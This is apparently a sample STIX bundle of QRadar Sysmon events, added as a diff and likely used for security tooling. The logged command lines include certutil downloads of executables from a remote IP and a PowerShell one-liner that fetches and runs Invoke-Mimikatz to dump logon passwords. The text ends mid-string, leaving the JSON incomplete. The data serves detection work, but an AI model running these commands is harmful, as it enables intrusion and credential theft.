@@ -1,0 +1,553 @@
+{
+    "type": "bundle",
+    "id": "bundle--83b27c20-a672-4c15-8555-20c1c08e543b",
+    "objects": [
+        {
+            "type": "identity",
+            "id": "identity--28067052-21d2-429f-8582-b55bbfb4eca3",
+            "name": "QRadar",
+            "identity_class": "events"
+        },
+        {
+            "id": "observed-data--cd6b9f45-f562-4941-ad0c-6c9a51724029",
+            "type": "observed-data",
+            "created_by_ref": "identity--28067052-21d2-429f-8582-b55bbfb4eca3",
+            "created": "2019-10-16T12:19:32.991Z",
+            "modified": "2019-10-16T12:19:32.991Z",
+            "objects": {
+                "0": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "2"
+                },
+                "1": {
+                    "type": "network-traffic",
+                    "src_ref": "0",
+                    "src_port": 0,
+                    "dst_ref": "3",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "2": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "4"
+                },
+                "4": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "5": {
+                    "type": "user-account",
+                    "user_id": "WinServer\\admin"
+                },
+                "6": {
+                    "type": "artifact",
+                    "payload_bin": "PDE4Mj5PY3QgMTAgMTc6NDI6NTQgV2luU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdl\nbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5kb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJz\naW9uPTcuMi44LjE0NQlTb3VyY2U9TWljcm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdp\nblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1dGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49\nTlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlFdmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0\nZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQyMTQJVGltZUdlbmVyYXRlZD0xNTcwMTEwODEzCVRpbWVX\ncml0dGVuPTE1NzAxMTA4MTMJTGV2ZWw9SW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAw\nMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNrLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5m\nbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRlOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMg\nMTM6NTM6MzMuNTM4IFByb2Nlc3NHdWlkOiB7MUMyRDNGNTQtRkQ1RC01RDk1LTAwMDAtMDAxMEEw\nMkUwQzAwfSBQcm9jZXNzSWQ6IDc0NCBJbWFnZTogQzpcV2luZG93c1xTeXN0ZW0zMlxjZXJ0dXRp\nbC5leGUgRmlsZVZlcnNpb246IDYuMS43NjAwLjE2Mzg1ICh3aW43X3J0bS4wOTA3MTMtMTI1NSkg\nRGVzY3JpcHRpb246IENlcnRVdGlsLmV4ZSBQcm9kdWN0OiBNaWNyb3NvZnTCriBXaW5kb3dzwq4g\nT3BlcmF0aW5nIFN5c3RlbSBDb21wYW55OiBNaWNyb3NvZnQgQ29ycG9yYXRpb24gQ29tbWFuZExp\nbmU6IGNlcnR1dGlsIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovLzY3LjIyOS45Ny4yMjkvYzY0\nLmV4ZSBjNjQuZXhlIEN1cnJlbnREaXJlY3Rvcnk6IEM6XFdpbmRvd3Ncc3lzdGVtMzJcIFVzZXI6\nIFdpblNlcnZlclxhZG1pbiBMb2dvbkd1aWQ6IHsxQzJEM0Y1NC1GNzM1LTVEOTUtMDAwMC0wMDIw\nOTQ2RDA0MDB9IExvZ29uSWQ6IDB4NDZkOTQgVGVybWluYWxTZXNzaW9uSWQ6IDEgSW50ZWdyaXR5\nTGV2ZWw6IEhpZ2ggSGFzaGVzOiBTSEExPTEwQ0U5MTc0QkZGNDg1NjA4M0U2QURBRDAwOTRBNzk4\nQ0VEMkMwNzksTUQ1PTdCOTczMTQ1RjdFMUI1OTMzMENBNEREMUY4NkIzRDU1LFNIQTI1Nj01ODky\nMjlFMkJEOTMxMDAwNDk5MDlFREY5ODI1RENFMjRGRjk2M0EwQzQ2NUQ5NjkwMjdEQjM0RTJFQjg3\nOEI0LElNUEhBU0g9N0EyNzJCOTE4NjgwRUU5MzFDNkZENjIyQ0FGQkE1NDIgUGFyZW50UHJvY2Vz\nc0d1aWQ6IHsxQzJEM0Y1NC1GQTcyLTVEOTUtMDAwMC0wMDEwRTJFNjA5MDB9IFBhcmVudFByb2Nl\nc3NJZDogMTY2OCBQYXJlbnRJbWFnZTogQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIFBhcmVu\ndENvbW1hbmRMaW5lOiAiQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIiAK"
+                },
+                "7": {
+                    "type": "file",
+                    "hashes": {
+                        "SHA-1": "10CE9174BFF4856083E6ADAD0094A798CED2C079",
+                        "MD5": "7B973145F7E1B59330CA4DD1F86B3D55",
+                        "SHA-256": "589229E2BD93100049909EDF9825DCE24FF963A0C465D969027DB34E2EB878B4",
+                        "imp": "7A272B918680EE931C6FD622CAFBA542"
+                    },
+                    "name": "certutil.exe",
+                    "parent_directory_ref": "8"
+                },
+                "8": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\certutil.exe"
+                },
+                "9": {
+                    "type": "process",
+                    "binary_ref": "7",
+                    "command_line": "certutil -urlcache -split -f http://67.229.97.229/c64.exe c64.exe",
+                    "cwd": "C:\\Windows\\system32\\",
+                    "pid": 744
+                },
+                "10": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\cmd.exe"
+                },
+                "11": {
+                    "type": "file",
+                    "parent_directory_ref": "10",
+                    "contains_refs": "7",
+                    "name": "cmd.exe"
+                }
+            },
+            "x_com_ibm_ariel": {
+                "devicetype": 12,
+                "qid_name": "Process Create",
+                "qid": 5001828,
+                "category_name": "Create Activity Succeeded    ",
+                "category_id": 19012,
+                "log_source_id": 112,
+                "log_source_name": "WinServer",
+                "identity_ip": "0.0.0.0",
+                "utf8_payload": "<182>Oct 10 17:42:54 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 744 Image: C:\\Windows\\System32\\certutil.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: CertUtil.exe Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: certutil -urlcache -split -f http://67.229.97.229/c64.exe c64.exe CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=10CE9174BFF4856083E6ADAD0094A798CED2C079,MD5=7B973145F7E1B59330CA4DD1F86B3D55,SHA256=589229E2BD93100049909EDF9825DCE24FF963A0C465D969027DB34E2EB878B4,IMPHASH=7A272B918680EE931C6FD622CAFBA542 ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "magnitude": 2
+            },
+            "first_observed": "2019-10-10T16:42:55.028Z",
+            "last_observed": "2019-10-10T16:42:55.028Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--ddcce9ff-1a89-47d4-858f-4962322ac0b4",
+            "type": "observed-data",
+            "created_by_ref": "identity--28067052-21d2-429f-8582-b55bbfb4eca3",
+            "created": "2019-10-16T12:20:32.965Z",
+            "modified": "2019-10-16T12:20:32.965Z",
+            "objects": {
+                "0": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "2"
+                },
+                "1": {
+                    "type": "network-traffic",
+                    "src_ref": "0",
+                    "src_port": 0,
+                    "dst_ref": "3",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "2": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "4"
+                },
+                "4": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "5": {
+                    "type": "user-account",
+                    "user_id": "WinServer\\admin"
+                },
+                "6": {
+                    "type": "artifact",
+                    "payload_bin": "PDE4Mj5PY3QgMTAgMTc6NDI6NTUgV2luU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdl\nbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5kb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJz\naW9uPTcuMi44LjE0NQlTb3VyY2U9TWljcm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdp\nblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1dGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49\nTlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlFdmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0\nZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQyMTQJVGltZUdlbmVyYXRlZD0xNTcwMTEwODEzCVRpbWVX\ncml0dGVuPTE1NzAxMTA4MTMJTGV2ZWw9SW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAw\nMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNrLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5m\nbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRlOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMg\nMTM6NTM6MzMuNTM4IFByb2Nlc3NHdWlkOiB7MUMyRDNGNTQtRkQ1RC01RDk1LTAwMDAtMDAxMEEw\nMkUwQzAwfSBQcm9jZXNzSWQ6IDc0NCBJbWFnZTogQzpcV2luZG93c1xTeXN0ZW0zMlxjZXJ0dXRp\nbC5leGUgRmlsZVZlcnNpb246IDYuMS43NjAwLjE2Mzg1ICh3aW43X3J0bS4wOTA3MTMtMTI1NSkg\nRGVzY3JpcHRpb246IENlcnRVdGlsLmV4ZSBQcm9kdWN0OiBNaWNyb3NvZnTCriBXaW5kb3dzwq4g\nT3BlcmF0aW5nIFN5c3RlbSBDb21wYW55OiBNaWNyb3NvZnQgQ29ycG9yYXRpb24gQ29tbWFuZExp\nbmU6IGNlcnR1dGlsIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovLzY3LjIyOS45Ny4yMjkvRjY0\nLmRhdGEgRjY0LmRhdGEgQ3VycmVudERpcmVjdG9yeTogQzpcV2luZG93c1xzeXN0ZW0zMlwgVXNl\ncjogV2luU2VydmVyXGFkbWluIExvZ29uR3VpZDogezFDMkQzRjU0LUY3MzUtNUQ5NS0wMDAwLTAw\nMjA5NDZEMDQwMH0gTG9nb25JZDogMHg0NmQ5NCBUZXJtaW5hbFNlc3Npb25JZDogMSBJbnRlZ3Jp\ndHlMZXZlbDogSGlnaCBIYXNoZXM6IFNIQTE9MTBDRTkxNzRCRkY0ODU2MDgzRTZBREFEMDA5NEE3\nOThDRUQyQzA3OSxNRDU9N0I5NzMxNDVGN0UxQjU5MzMwQ0E0REQxRjg2QjNENTUsU0hBMjU2PTU4\nOTIyOUUyQkQ5MzEwMDA0OTkwOUVERjk4MjVEQ0UyNEZGOTYzQTBDNDY1RDk2OTAyN0RCMzRFMkVC\nODc4QjQsSU1QSEFTSD03QTI3MkI5MTg2ODBFRTkzMUM2RkQ2MjJDQUZCQTU0MiBQYXJlbnRQcm9j\nZXNzR3VpZDogezFDMkQzRjU0LUZBNzItNUQ5NS0wMDAwLTAwMTBFMkU2MDkwMH0gUGFyZW50UHJv\nY2Vzc0lkOiAxNjY4IFBhcmVudEltYWdlOiBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUgUGFy\nZW50Q29tbWFuZExpbmU6ICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUiIAo="
+                },
+                "7": {
+                    "type": "file",
+                    "hashes": {
+                        "SHA-1": "10CE9174BFF4856083E6ADAD0094A798CED2C079",
+                        "MD5": "7B973145F7E1B59330CA4DD1F86B3D55",
+                        "SHA-256": "589229E2BD93100049909EDF9825DCE24FF963A0C465D969027DB34E2EB878B4",
+                        "imp": "7A272B918680EE931C6FD622CAFBA542"
+                    },
+                    "name": "certutil.exe",
+                    "parent_directory_ref": "8"
+                },
+                "8": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\certutil.exe"
+                },
+                "9": {
+                    "type": "process",
+                    "binary_ref": "7",
+                    "command_line": "certutil -urlcache -split -f http://67.229.97.229/F64.data F64.data",
+                    "cwd": "C:\\Windows\\system32\\",
+                    "pid": 744
+                },
+                "10": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\cmd.exe"
+                },
+                "11": {
+                    "type": "file",
+                    "parent_directory_ref": "10",
+                    "contains_refs": "7",
+                    "name": "cmd.exe"
+                }
+            },
+            "x_com_ibm_ariel": {
+                "devicetype": 12,
+                "qid_name": "Process Create",
+                "qid": 5001828,
+                "category_name": "Create Activity Succeeded    ",
+                "category_id": 19012,
+                "log_source_id": 112,
+                "log_source_name": "WinServer",
+                "identity_ip": "0.0.0.0",
+                "utf8_payload": "<182>Oct 10 17:42:55 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 744 Image: C:\\Windows\\System32\\certutil.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: CertUtil.exe Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: certutil -urlcache -split -f http://67.229.97.229/F64.data F64.data CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=10CE9174BFF4856083E6ADAD0094A798CED2C079,MD5=7B973145F7E1B59330CA4DD1F86B3D55,SHA256=589229E2BD93100049909EDF9825DCE24FF963A0C465D969027DB34E2EB878B4,IMPHASH=7A272B918680EE931C6FD622CAFBA542 ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "magnitude": 2
+            },
+            "first_observed": "2019-10-10T16:42:56.094Z",
+            "last_observed": "2019-10-10T16:42:56.094Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--a107f770-b462-43e6-a80d-d349489c9724",
+            "type": "observed-data",
+            "created_by_ref": "identity--28067052-21d2-429f-8582-b55bbfb4eca3",
+            "created": "2019-10-16T12:27:26.693Z",
+            "modified": "2019-10-16T12:27:26.693Z",
+            "objects": {
+                "0": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "2"
+                },
+                "1": {
+                    "type": "network-traffic",
+                    "src_ref": "0",
+                    "src_port": 0,
+                    "dst_ref": "3",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "2": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "4"
+                },
+                "4": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "5": {
+                    "type": "user-account",
+                    "user_id": "WinServer\\admin"
+                },
+                "6": {
+                    "type": "artifact",
+                    "payload_bin": "PDE4Mj5PY3QgMTAgMTc6NDI6NTcgV2luU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdl\nbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5kb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJz\naW9uPTcuMi44LjE0NQlTb3VyY2U9TWljcm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdp\nblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1dGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49\nTlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlFdmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0\nZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQxODgJVGltZUdlbmVyYXRlZD0xNTcwMTEwNjcwCVRpbWVX\ncml0dGVuPTE1NzAxMTA2NzAJTGV2ZWw9SW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAw\nMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNrLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5m\nbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRlOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMg\nMTM6NTE6MTAuNTcwIFByb2Nlc3NHdWlkOiB7MUMyRDNGNTQtRkNDRS01RDk1LTAwMDAtMDAxMDc4\nRUIwQjAwfSBQcm9jZXNzSWQ6IDIyNTIgSW1hZ2U6IEM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93\nc1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSBGaWxlVmVyc2lvbjogMTAuMC4xNDQwOS4x\nMDA1IChyczFfc3J2b29iLjE2MTIwOC0xMTU1KSBEZXNjcmlwdGlvbjogV2luZG93cyBQb3dlclNo\nZWxsIFByb2R1Y3Q6IE1pY3Jvc29mdMKuIFdpbmRvd3PCriBPcGVyYXRpbmcgU3lzdGVtIENvbXBh\nbnk6IE1pY3Jvc29mdCBDb3Jwb3JhdGlvbiBDb21tYW5kTGluZTogcG93ZXJzaGVsbCAiSUVYIChO\nZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRo\ndWJ1c2VyY29udGVudC5jb20vUG93ZXJTaGVsbE1hZmlhL1Bvd2VyU3Bsb2l0L21hc3Rlci9FeGZp\nbHRyYXRpb24vSW52b2tlLU1pbWlrYXR6LnBzMScpO0ludm9rZS1NaW1pa2F0eiAtQ29tbWFuZCAn\ncHJpdmlsZWdlOjpkZWJ1ZyBzZWt1cmxzYTo6bG9nb25wYXNzd29yZHMgZXhpdCciIEN1cnJlbnRE\naXJlY3Rvcnk6IEM6XFdpbmRvd3Ncc3lzdGVtMzJcIFVzZXI6IFdpblNlcnZlclxhZG1pbiBMb2dv\nbkd1aWQ6IHsxQzJEM0Y1NC1GNzM1LTVEOTUtMDAwMC0wMDIwOTQ2RDA0MDB9IExvZ29uSWQ6IDB4\nNDZkOTQgVGVybWluYWxTZXNzaW9uSWQ6IDEgSW50ZWdyaXR5TGV2ZWw6IEhpZ2ggSGFzaGVzOiBT\nSEExPUYzOTNEN0I1MzFDRDQ0Q0U0MTg2NDdGRTk1NzE1QURDM0UzQzYxRDIsTUQ1PUVCMzJDMDcw\nRTY1ODkzN0FBOUZBOUYzQUU2MjlCMkI4LFNIQTI1Nj03MEJBNTdGQjBCRjJGMzRCODY0MjZEMjE1\nNTlGNUY2RDA1QzEyNjgxOTM5MDRERThFOTU5RDdCMDZDRTk2NENFLElNUEhBU0g9QTREMzJGMUFF\nRjUyNUI4QURBNkEyNkYyODU5NkFDMkUgUGFyZW50UHJvY2Vzc0d1aWQ6IHsxQzJEM0Y1NC1GQTcy\nLTVEOTUtMDAwMC0wMDEwRTJFNjA5MDB9IFBhcmVudFByb2Nlc3NJZDogMTY2OCBQYXJlbnRJbWFn\nZTogQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIFBhcmVudENvbW1hbmRMaW5lOiAiQzpcV2lu\nZG93c1xTeXN0ZW0zMlxjbWQuZXhlIiAK"
+                },
+                "7": {
+                    "type": "file",
+                    "hashes": {
+                        "SHA-1": "F393D7B531CD44CE418647FE95715ADC3E3C61D2",
+                        "MD5": "EB32C070E658937AA9FA9F3AE629B2B8",
+                        "SHA-256": "70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE",
+                        "imp": "A4D32F1AEF525B8ADA6A26F28596AC2E"
+                    },
+                    "name": "powershell.exe",
+                    "parent_directory_ref": "8"
+                },
+                "8": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                },
+                "9": {
+                    "type": "process",
+                    "binary_ref": "7",
+                    "command_line": "powershell \"IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command privilege::debug sekurlsa::logonpasswords exit\"",
+                    "cwd": "C:\\Windows\\system32\\",
+                    "pid": 2252
+                },
+                "10": {
+                    "type": "directory",
+                    "path": "C:\\Windows\\System32\\cmd.exe"
+                },
+                "11": {
+                    "type": "file",
+                    "parent_directory_ref": "10",
+                    "contains_refs": "7",
+                    "name": "cmd.exe"
+                }
+            },
+            "x_com_ibm_ariel": {
+                "devicetype": 12,
+                "qid_name": "Process Create",
+                "qid": 5001828,
+                "category_name": "Create Activity Succeeded    ",
+                "category_id": 19012,
+                "log_source_id": 112,
+                "log_source_name": "WinServer",
+                "identity_ip": "0.0.0.0",
+                "utf8_payload": "<182>Oct 10 17:42:57 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command privilege::debug sekurlsa::logonpasswords exit\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "magnitude": 6
+            },
+            "first_observed": "2019-10-10T16:42:58.030Z",
+            "last_observed": "2019-10-10T16:42:58.030Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--aaaf1647-7206-4259-b5a3-c8c709fc6823",
+            "type": "observed-data",
+            "created_by_ref": "identity--28067052-21d2-429f-8582-b55bbfb4eca3",
+            "created": "2019-10-16T12:30:47.548Z",
+            "modified": "2019-10-16T12:30:47.548Z",
+            "objects": {
+                "0": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "2"
+                },
+                "1": {
+                    "type": "network-traffic",
+                    "src_ref": "0",
+                    "src_port": 0,
+                    "dst_ref": "3",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "2": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": "4"
+                },
+                "4": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "5": {
+                    "type": "artifact",
+                    "payload_bin": "PDE4Mj5PY3QgMTAgMTU6NDc6MTYgV2luU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdl\nbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5kb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJz\naW9uPTcuMi44LjE0NQlTb3VyY2U9TWljcm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdp\nblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1dGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49\nTlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlFdmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0\nZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQyMTQJVGltZUdlbmVyYXRlZD0xNTcwMTEwODEzCVRpbWVX\ncml0dGVuPTE1NzAxMTA4MTMJTGV2ZWw9SW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAw\nMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNrLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5m\nbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRlOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMg\nMTM6NTM6MzMuNTM4IFByb2Nlc3NHdWlkOiB7MUMyRDNGNTQtRkQ1RC01RDk1LTAwMDAtMDAxMEEw\nMkUwQzAwfSBQcm9jZXNzSWQ6IDc0NCBJbWFnZTogQzpcV2luZG93c1xTeXN0ZW0zMlxjZXJ0dXRp\nbC5leGUgRmlsZVZlcnNpb246IDYuMS43NjAwLjE2Mzg1ICh3aW43X3J0bS4wOTA3MTMtMTI1NSkg\nRGVzY3JpcHRpb246IENlcnRVdGlsLmV4ZSBQcm9kdWN0OiBNaWNyb3NvZnTCriBXaW5kb3dzwq4g\nT3BlcmF0aW5nIFN5c3RlbSBDb21wYW55OiBNaWNyb3NvZnQgQ29ycG9yYXRpb24gQ29tbWFuZExp\nbmU6IGNlcnR1dGlsIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovLzY3LjIyOS45Ny4yMjkvYzY0\nLmV4ZSBjNjQuZXhlIEN1cnJlbnREaXJlY3Rvcnk6IEM6XFdpbmRvd3Ncc3lzdGVtMzJcIFVzZXI6\nIFdpblNlcnZlclxhZG1pbiBMb2dvbkd1aWQ6IHsxQzJEM0Y1NC1GNzM1LTVEOTUtMDAwMC0wMDIw\nOTQ2RDA0MDB9IExvZ29uSWQ6IDB4NDZkOTQgVGVybWluYWxTZXNzaW9uSWQ6IDEgSW50ZWdyaXR5\nTGV2ZWw6IEhpZ2ggSGFzaGVzOiBTSEExPTEwQ0U5MTc0QkZGNDg1NjA4M0U2QURBRDAwOTRBNzk4\nQ0VEMkMwNzksTUQ1PTdCOTczMTQ1RjdFMUI1OTMzMENBNEREMUY4NkIzRDU1LFNIQTI1Nj01ODky\nMjlFMkJEOTMxMDAwNDk5MDlFREY5ODI1RENFMjRGRjk2M0EwQzQ2NUQ5NjkwMjdEQjM0RTJFQjg3\nOEI0LElNUEhBU0g9N0EyNzJCOTE4NjgwRUU5MzFDNkZENjIyQ0FGQkE1NDIgUGFyZW50UHJvY2Vz\nc0d1aWQ6IHsxQzJEM0Y1NC1GQTcyLTVEOTUtMDAwMC0wMDEwRTJFNjA5MDB9IFBhcmVudFByb2Nl\nc3NJZDogMTY2OCBQYXJlbnR